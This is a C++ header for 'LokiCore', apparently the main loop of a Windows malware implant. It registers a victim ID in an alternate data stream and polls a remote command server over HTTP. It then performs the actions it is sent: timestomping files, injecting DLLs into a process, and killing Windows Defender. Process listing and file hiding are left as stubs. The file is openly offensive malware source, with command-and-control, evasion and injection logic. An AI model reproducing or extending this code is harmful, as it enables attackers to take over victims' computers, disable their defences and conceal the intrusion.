#pragma once
#include <Windows.h>
#include <iostream>
#include <curl/curl.h>
#include <ntstatus.h>
#include <unordered_map>
#include "resource.h"
#include "httpRequest.h"
#include "IPC.h"
#include "NetSignature.h"
#include "TimeStomping.h"
#include "Utils.h"
#include "DLLInjection.h"
#include "WinDefKiller.h"

using namespace std;

class LokiCore{

	enum action {
		TimeStomping = 0,
		DLLInjection = 1,
		ListProcesses = 2,
		WinDefenderKiller = 3,
		HideFile = 4,
	};

	public:
		typedef LONG NTSTATUS;

        int init() {
			char fakeID[] = "0";
			IPC ipc = IPC();	
			ipc.storeStringADS(fakeID);
			string victimID = ipc.readStringADS();



			/*Utils utils = Utils();
			int pid = utils.getPIDbyProcName("notepad.exe");

			DLLInjector dllInjector = DLLInjector();
			char dllPath[] = "C:\\Users\\b\\Desktop\\LokiServer\\LokiServer\\bin\\Debug\\net7.0\\System.Data.SqlClient.dll";
			dllInjector.DLLinjector(pid, dllPath);*/



			string lastAction = "-1";
            while (true) {
				string action = "";
				httpRequest http = httpRequest();
				string result = http.httpNewAction(victimID);

				action = result.substr(0, result.find(","));
				if (lastAction == result.substr(result.find(",") + 1, result.length())) {
					OutputDebugStringA("Same action as last time, skipping");
					SleepImplant(5000);
					continue;
				}
				lastAction = result.substr(result.find(",") + 1, result.length());
				int actionInt = stoi(action);

				string params = "";
				string srcFile;
				string dstFile;
				char srcFileChar[MAX_PATH];
				char dstFileChar[MAX_PATH];
				string dllPath = "";
				int pid;
				string processName;

				switch (actionInt) {
					
					case TimeStomping:
						TimeStompingClass timeStomper = TimeStompingClass();
						params = http.httpGetParamsAction(victimID, action);

						srcFile = params.substr(params.find("srcFile=") + 8, params.find(",") - 8);
						dstFile = params.substr(params.find("dstFile=") + 8, params.length() - 8);

						strcpy_s(srcFileChar, srcFile.c_str());
						strcpy_s(dstFileChar, dstFile.c_str());						

						timeStomper.copyStamps(srcFileChar, dstFileChar);
						break;

					case DLLInjection:
						params = http.httpGetParamsAction(victimID, action);
						processName = params.substr(params.find("process=") + 8, params.find(",") - 8);
						dllPath = params.substr(params.find("dllPath=") + 8, params.length() - 8);

						Utils utils = Utils();
						pid = utils.getPIDbyProcName("notepad.exe");

						DLLInjector dllInjector = DLLInjector();
						dllInjector.DLLinjector(pid, dllPath.c_str());
						break;

					case ListProcesses:
						// instructions for listing processes			
						break;

					case WinDefenderKiller:
						WinDefKiller winDefKiller = WinDefKiller();
						winDefKiller.killWinDefender();
						break;
					
					case HideFile:
						// instructions for hiding file

						break;
				}

                OutputDebugStringA(result.c_str());
                SleepImplant(5000);
            }

            return 0;
        }

	private:


		bool SleepImplant(DWORD dwMilliseconds) {
			HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
			if (hEvent == NULL) {
				return false;
			}
			HANDLE hTimer = NULL;
			LARGE_INTEGER liDueTime;
			liDueTime.QuadPart = -10000LL * dwMilliseconds;
			hTimer = CreateWaitableTimer(NULL, TRUE, NULL);
			if (hTimer == NULL) {
				CloseHandle(hEvent);
				return false;
			}
			if (!SetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, FALSE)) {
				CloseHandle(hEvent);
				CloseHandle(hTimer);
				return false;
			}
			if (WaitForSingleObject(hTimer, INFINITE) != WAIT_OBJECT_0) {
				CloseHandle(hEvent);
				CloseHandle(hTimer);
				return false;
			}
			CloseHandle(hEvent);
			CloseHandle(hTimer);
			return true;
		}

		static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
			size_t total_size = size * nmemb;
			output->append(static_cast<char*>(contents), total_size);
			return total_size;
		}
};